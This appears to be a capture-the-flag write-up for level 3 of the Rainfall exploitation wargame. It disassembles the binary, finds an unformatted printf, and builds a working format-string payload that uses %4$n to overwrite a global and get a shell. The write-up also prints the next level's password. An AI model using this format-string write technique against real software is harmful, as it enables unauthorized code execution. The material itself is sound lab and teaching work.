# Rainfall

## Level3

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
```

```sh
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)          ; 3rd arg = stdin
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)        ; 2nd arg = 512
   0x080484be <+26>:    lea    -0x208(%ebp),%eax       ; buffer starts at EBP-0x208
   0x080484c4 <+32>:    mov    %eax,(%esp)             ; 1st arg = buffer
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>   ; fgets(buffer, 512, stdin)
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>  ; printf(buffer)  ← no format
   0x080484da <+54>:    mov    0x804988c,%eax          ; load *global
   0x080484df <+59>:    cmp    $0x40,%eax              ; global == 0x40 ?
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax          ; TRUE
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave                          ; FALSE
   0x08048519 <+117>:   ret
End of assembler dump.
```

`fgets` is bounded (512). This is not a stack overflow.

The bug is `printf(buffer)`: our input is the format string.
The check loads the value at `0x804988c` and compares it to `0x40`.

If we set that global to `64`, we get fwrite + system.

### Format string

printf reads extra arguments from the stack after the format pointer.

If the format contains `%p` / `%n` and we did not pass matching arguments, it still reads the next stack slots.
The buffer itself sits on that stack, so after a few dummy slots we reach our own input.

```sh
level3@RainFall:~$ ./level3
AAAA %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
```
|-----------|--------------|---------------------------------|
| Specifier | Value        | Explaination                    |
|-----------|--------------|---------------------------------|
| ---       | ---          | ---                             |
| 1st `%p`  | `0x200`      | leftover stack value            |
| 2nd `%p`  | `0xb7fd1ac0` | leftover stack value            |
| 3rd `%p`  | `0xb7ff37d0` | leftover stack value            |
| 4th `%p`  | `0x41414141` | `"AAAA"` = first 4 bytes of buf |
| 5th `%p`  | `0x20702520` | `" %p "`                        |
|-----------|--------------|---------------------------------|


So the start of our buffer is the 4th variadic argument.

`4$` target the 4th variadic argument
`%n` = write the number of characters printed so far into the `int *` given by that argument.
`%4$n` writes through the 4th variadic argument.


### Exploit

target address: `0x804988c` → \x8c\x98\x04\x08

The 4th variadic argument is the first 4 bytes of our buffer.
We put the global's address there.

We need that global to become `0x40` (64).
`%n` writes "how many chars were printed so far".
4 bytes of address + 60 padding chars = 64.

`%4$n` = write 64 into the int pointed to by the 4th argument
     = write `64` at `0x804988c`

```sh
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' ; cat) | ./level3
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

`cat` keeps stdin open for the shell spawned by `system`